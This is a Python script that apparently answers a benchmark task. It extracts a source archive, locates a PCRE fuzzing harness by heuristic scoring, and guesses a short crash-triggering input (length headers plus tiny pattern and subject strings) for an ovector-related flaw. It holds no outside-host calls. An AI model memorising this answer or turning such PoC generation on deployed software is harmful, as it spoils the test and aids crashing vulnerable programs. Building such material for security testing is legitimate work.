import os
import re
import tarfile
import tempfile
import shutil
import struct
from typing import Dict, Tuple, Optional, List


def _is_within_directory(directory: str, target: str) -> bool:
    abs_directory = os.path.abspath(directory)
    abs_target = os.path.abspath(target)
    return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not _is_within_directory(path, member_path):
            continue
        try:
            tar.extract(member, path=path)
        except Exception:
            pass


def _extract_src(src_path: str) -> Tuple[str, Optional[str]]:
    if os.path.isdir(src_path):
        return src_path, None
    tmpdir = tempfile.mkdtemp(prefix="poc_src_")
    try:
        with tarfile.open(src_path, mode="r:*") as tar:
            _safe_extract_tar(tar, tmpdir)
    except Exception:
        shutil.rmtree(tmpdir, ignore_errors=True)
        tmpdir = tempfile.mkdtemp(prefix="poc_src_")
    return tmpdir, tmpdir


def _read_text_file(path: str, limit: int = 800_000) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(limit)
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _gather_sources(root: str) -> Dict[str, str]:
    exts = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
        ".in", ".inc", ".ipp", ".m", ".mm"
    }
    out: Dict[str, str] = {}
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames[:] = [d for d in dirnames if d not in (".git", ".svn", ".hg", "build", "out", "dist", "node_modules")]
        for fn in filenames:
            _, ext = os.path.splitext(fn)
            if ext.lower() not in exts:
                continue
            full = os.path.join(dirpath, fn)
            try:
                st = os.stat(full)
                if st.st_size > 2_000_000:
                    continue
            except Exception:
                continue
            txt = _read_text_file(full)
            if txt:
                out[full] = txt
    return out


def _looks_like_definition(text: str, func: str) -> bool:
    # crude: detect "int pcre_exec(" etc
    pat = r'(^|\n)\s*(?:static\s+)?(?:inline\s+)?(?:extern\s+)?(?:int|PCRE_EXP_DEFN\s*\(\s*int\s*\)|PCRE2_EXP_DEFN\s*\(\s*int\s*\)|void)\s+' + re.escape(func) + r'\s*\('
    return re.search(pat, text) is not None


def _score_candidate(path: str, text: str) -> int:
    score = 0
    base = text

    if "LLVMFuzzerTestOneInput" in base:
        score += 300
    if re.search(r'(^|\n)\s*int\s+main\s*\(', base):
        score += 120

    # prefer harness-like
    if "FuzzedDataProvider" in base:
        score += 60
    if "Data" in base and "Size" in base:
        score += 40
    if "stdin" in base or "fread" in base or "read(" in base or "getline" in base:
        score += 20

    # PCRE cues
    pcre_calls = 0
    for fn in ("pcre_exec", "pcre_compile", "pcre_dfa_exec", "pcre2_match", "pcre2_compile"):
        if fn in base:
            pcre_calls += 1
            score += 80
            if _looks_like_definition(base, fn):
                score -= 250

    if "ovector" in base or "ovecsize" in base or "OVECCOUNT" in base:
        score += 60

    # file name hints
    lower = os.path.basename(path).lower()
    if "fuzz" in lower or "afl" in lower or "honggfuzz" in lower:
        score += 80
    if "test" in lower:
        score += 10

    # downrank library sources
    if any(x in path.lower() for x in ("/pcre/", "\\pcre\\", "/src/", "\\src\\")) and ("LLVMFuzzerTestOneInput" not in base and "int main" not in base):
        score -= 40

    return score


def _choose_harness_text(sources: Dict[str, str]) -> str:
    best_score = -10**9
    best_text = ""
    for p, t in sources.items():
        s = _score_candidate(p, t)
        if s > best_score:
            best_score = s
            best_text = t
    return best_text


def _detect_delim(text: str) -> bytes:
    t = text
    if re.search(r"(find|memchr|strchr|split)\s*\(.*'\\n'", t) or "\\n" in t or "'\\n'" in t:
        return b"\n"
    if re.search(r"(find|memchr|strchr|split)\s*\(.*'\\0'", t) or "'\\0'" in t or "\\0" in t:
        return b"\x00"
    # default for textual split harnesses
    return b"\n"


def _has_length_prefixed_two_fields(text: str) -> bool:
    t = text
    # strong signals: read 2 lengths and use Data+8 / size checks
    if re.search(r"Size\s*<\s*8", t) and re.search(r"Data\s*\+\s*8", t):
        # if also any "len" vars and offset arithmetic with those
        if re.search(r"\b(pat(?:tern)?|re|regex)\w*len\w*\b", t, re.IGNORECASE) or re.search(r"\b(sub(?:ject)?|str|text)\w*len\w*\b", t, re.IGNORECASE):
            return True
        if re.search(r"Data\s*\+\s*8\s*\+\s*\w+", t):
            return True

    # common fuzzer header: two uint32_t lengths
    if re.search(r"\*(?:const\s+)?uint32_t\s*\*\s*\)\s*Data", t) and re.search(r"\*(?:const\s+)?uint32_t\s*\*\s*\)\s*\(\s*Data\s*\+\s*4", t):
        if re.search(r"Data\s*\+\s*8", t):
            return True
        if re.search(r"memcpy\s*\(\s*&\w+\s*,\s*Data\s*,\s*4\s*\)", t) and re.search(r"memcpy\s*\(\s*&\w+\s*,\s*Data\s*\+\s*4\s*,\s*4\s*\)", t):
            return True

    return False


def _length_fields_allow_zero(text: str) -> Tuple[bool, bool]:
    t = text
    # If there are explicit checks that reject zero lengths, detect them.
    # Default assume zero allowed.
    pat_zero_rejected = bool(re.search(r"\b(pat(?:tern)?|re|regex)\w*len\w*\s*==\s*0\s*\)\s*return", t, re.IGNORECASE))
    sub_zero_rejected = bool(re.search(r"\b(sub(?:ject)?|str|text)\w*len\w*\s*==\s*0\s*\)\s*return", t, re.IGNORECASE))
    # Also detect std::string empty checks
    if re.search(r"pattern\.\s*empty\s*\(\s*\)\s*\)\s*return", t):
        pat_zero_rejected = True
    if re.search(r"subject\.\s*empty\s*\(\s*\)\s*return", t):
        sub_zero_rejected = True
    return (not pat_zero_rejected, not sub_zero_rejected)


def _detect_header_bytes_before_string(text: str) -> int:
    t = text
    # Heuristic: count early "Data += N; Size -= N;" occurrences; take minimal plausible header.
    # We only care about small headers (0,4,8,12,16).
    header = 0
    # if uses Size < 8 and Data+8 patterns, assume 8 header
    if re.search(r"Size\s*<\s*8", t) and (re.search(r"Data\s*\+\s*8", t) or re.search(r"data\s*\+\s*8", t)):
        header = max(header, 8)
    if re.search(r"Data\s*\+\s*4", t) or re.search(r"data\s*\+\s*4", t):
        header = max(header, 4)

    # look for explicit pointer advancement
    adv = re.findall(r"\bData\s*\+\=\s*(\d+)\s*;", t)
    sub = re.findall(r"\bSize\s*\-\=\s*(\d+)\s*;", t)
    if adv and sub:
        try:
            adv_sum = sum(int(x) for x in adv[:6] if int(x) in (1, 2, 4, 8, 16))
            sub_sum = sum(int(x) for x in sub[:6] if int(x) in (1, 2, 4, 8, 16))
            if adv_sum == sub_sum and adv_sum in (1, 2, 4, 8, 12, 16):
                header = max(header, adv_sum)
        except Exception:
            pass
    return header


def _detect_ovecs_from_input(text: str) -> bool:
    t = text
    if re.search(r"\bovec(size|count)\b", t) and "Data" in t:
        return True
    if re.search(r"\bovector\b", t) and "Data" in t:
        return True
    return False


def _detect_split_strings(text: str) -> bool:
    t = text
    # any splitting behavior
    if re.search(r"find\s*\(\s*['\"]\\n['\"]\s*\)", t):
        return True
    if re.search(r"memchr\s*\(\s*Data\s*,\s*'\\n'", t):
        return True
    if re.search(r"memchr\s*\(\s*Data\s*,\s*0\s*,", t):
        return True
    if re.search(r"find\s*\(\s*['\"]\\0['\"]\s*\)", t):
        return True
    if re.search(r"getline\s*\(", t) and "stdin" in t:
        return True
    # common: split on '\n' via loop
    if re.search(r"for\s*\(.*;.*<\s*Size.*\)\s*\{[^}]*Data\[.*\]\s*==\s*'\\n'", t, re.DOTALL):
        return True
    return False


def _build_poc_from_analysis(text: str) -> bytes:
    delim = _detect_delim(text)

    if _has_length_prefixed_two_fields(text):
        pat_allow_zero, sub_allow_zero = _length_fields_allow_zero(text)
        patlen = 0 if pat_allow_zero else 1
        sublen = 0 if sub_allow_zero else 1

        # Ensure a match occurs (empty pattern matches empty subject; otherwise use 'a')
        pat = b"" if patlen == 0 else b"a"
        sub = b"" if sublen == 0 else b"a"
        return struct.pack("<II", patlen, sublen) + pat + sub

    header = _detect_header_bytes_before_string(text)
    split = _detect_split_strings(text)
    ovecs_from_input = _detect_ovecs_from_input(text)

    # Prefer a compact 8-byte PoC when possible:
    # - If header is 4 bytes: 4 bytes ovecsize + 4 bytes "a<d>a<d>"
    # - If header is 8 bytes and split: 8 header bytes only if strings are constant; otherwise append minimal body.
    # - If no reliable inference: use 8 zeros.
    body = b"a" + delim + b"a" + delim  # 4 bytes

    # If it looks like a pure numeric-header harness (e.g. expects 8 bytes and doesn't split), try 8 bytes only.
    if header >= 8 and not split:
        # Likely two integers; set ovecsize in one of them, keep other 0
        # Use conservative positive values to avoid OOM.
        return struct.pack("<II", 0, 32)

    if header == 8 and split:
        # two header fields then pattern/subject
        # Keep total short; 8+4=12
        return struct.pack("<II", 0, 32) + body

    if header == 4:
        # assume first field controls ovector size or similar; 32 is safe
        return struct.pack("<I", 32) + body

    if header == 0 and split:
        return body

    # If it expects ovecsize but we didn't detect header, provide simplest split-only.
    if ovecs_from_input and split:
        return body

    # fallback: 8 bytes (often enough for length-prefixed harness or numeric options)
    return b"\x00" * 8


class Solution:
    def solve(self, src_path: str) -> bytes:
        root, tmp = _extract_src(src_path)
        try:
            sources = _gather_sources(root)
            harness_text = _choose_harness_text(sources) if sources else ""
            poc = _build_poc_from_analysis(harness_text if harness_text else "")
            if not isinstance(poc, (bytes, bytearray)):
                poc = bytes(poc)
            return bytes(poc)
        finally:
            if tmp is not None:
                shutil.rmtree(tmp, ignore_errors=True)